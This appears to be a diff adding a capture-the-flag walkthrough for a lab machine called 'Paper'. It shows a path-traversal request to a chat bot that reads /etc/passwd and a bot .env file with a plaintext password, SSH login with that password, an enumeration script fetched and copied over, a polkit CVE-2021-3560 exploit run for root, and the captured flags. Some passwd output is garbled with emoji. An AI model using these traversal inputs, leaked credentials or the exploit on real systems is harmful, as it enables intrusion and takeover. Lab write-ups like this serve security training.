@@ -131,3 +131,185 @@ http://chat.office.paper/register/8qozr226AhkCHZdyY
 
 the pwnbox machine stopped here.
 
+in rocket chat you can interact with the bot itself
+
+```
+ kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
+Most frequently asked questions include:
+- What time is it?
+- What new files are in your sales directory?
+- Why did the salesman crossed the road?
+- What's the content of file x in your sales directory? etc.
+Please note that I am a beta version and I still have some bugs to be fixed.
+How to use me ? :
+1. Small Talk:
+You can ask me how dwight's weekend was, or did he watched the game last night etc.
+eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
+2. Joke:
+You can ask me Why the salesman crossed the road.
+eg: 'recyclops why did the salesman crossed the road?'
+<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
+For security reasons, the access is limited to the Sales folder.
+3. Files:
+eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'
+4. List:
+You can ask me to list the files
+5. Time:
+You can ask me to what the time is
+eg: 'recyclops what time is it?' or just 'recyclops time'
+
+```
+
+so you can get directory listing
+
+```
+
+ Fetching the directory listing of ../../../../../etc/passwd
+-rw-r--r--. 1 root root 2842 Jan 13 10:56 /home/dwight/sales/../../../../../etc/passwd
+<!=====Contents of file ../../../../../etc/passwd=====>
+root❌0:0:root:/root:/bin/bash
+bin❌1:1:bin:/bin:/sbin/nologin
+daemon❌2:2:daemon:/sbin:/sbin/nologin
+adm❌3:4:adm:/var/adm:/sbin/nologin
+lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
+sync❌5:0:sync:/sbin:/bin/sync
+shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
+halt❌7:0:halt:/sbin:/sbin/halt
+mail❌8:12:mail:/var/spool/mail:/sbin/nologin
+operator❌11:0:operator:/root:/sbin/nologin
+games❌12💯games:/usr/games:/sbin/nologin
+ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
+nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
+dbus❌81:81:System message bus:/:/sbin/nologin
+systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin
+systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin
+tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+polkitd❌998:996:User for polkitd:/:/sbin/nologin
+geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin
+rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin
+qemu❌107:107:qemu user:/:/sbin/nologin
+apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin
+cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin
+pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin
+unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin
+chrony❌993:987::/var/lib/chrony:/sbin/nologin
+libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
+saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
+radvd❌75:75:radvd user:/:/sbin/nologin
+clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
+pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+sssd❌983:981:User for sssd:/:/sbin/nologin
+colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin
+rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin
+pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
+gdm❌42:42::/var/lib/gdm:/sbin/nologin
+gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin
+insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin
+sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+tcpdump❌72:72::/:/sbin/nologin
+mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
+nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
+mongod❌976:974:mongod:/var/lib/mongo:/bin/false
+rocketchat❌1001:1001::/home/rocketchat:/bin/bash
+dwight❌1004:1004::/home/dwight:/bin/bash
+<!=====End of file ../../../../../etc/passwd=====>
+```
+
+```
+ <!=====Contents of file ../hubot/.env=====>
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1
+<!=====End of file ../hubot/.env=====>
+```
+
+ssh into user using the id
+
+```
+[dwight@paper ~]$ ls
+bot_restart.sh  hubot  sales  user.txt
+[dwight@paper ~]$ cat user.txt
+84c440ab09c9089e6873da2417576300
+[dwight@paper ~]$ 
+```
+
+for root
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
+100  758k  100  758k    0     0   136k      0  0:00:05  0:00:05 --:--:--  172k
+
+```
+```
+┌──(kali㉿kali)-[~]
+└─$ scp linpeas.sh dwight@office.paper:linpeas.sh
+The authenticity of host 'office.paper (10.129.128.121)' can't be established.
+ECDSA key fingerprint is SHA256:2eiFA8VFQOZukubwDkd24z/kfLkdKlz4wkAa/lRN3Lg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'office.paper' (ECDSA) to the list of known hosts.
+dwight@office.paper's password: 
+Permission denied, please try again.
+dwight@office.paper's password: 
+Permission denied, please try again.
+dwight@office.paper's password: 
+linpeas.sh   
+
+```
+1583c9698e80c14d2fe148f9eef37289
+
+running linpeas to find vuln
+
+```
+[dwight@paper ~]$ python3 explot.py
+**************
+Exploit: Privilege escalation with polkit - CVE-2021-3560
+Exploit code written by Ahmad Almorabea @almorabea
+Original exploit author: Kevin Backhouse 
+For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
+**************
+[+] Starting the Exploit 
+[+] User Created with the name of ahmed
+[+] Timed out at: 0.006805316214353887
+[+] Timed out at: 0.00775959879493205
+[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root 
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+bash: cannot set terminal process group (95164): Inappropriate ioctl for device
+bash: no job control in this shell
+[root@paper dwight]# whoami
+root
+[root@paper dwight]# ls
+bot_restart.sh  explot.py  hubot  linpeas.sh  sales  user.txt  xp.sh
+[root@paper dwight]# cat /root/root.txt
+1583c9698e80c14d2fe148f9eef37289
+````
+
+
+
+
+
+
+
+
+
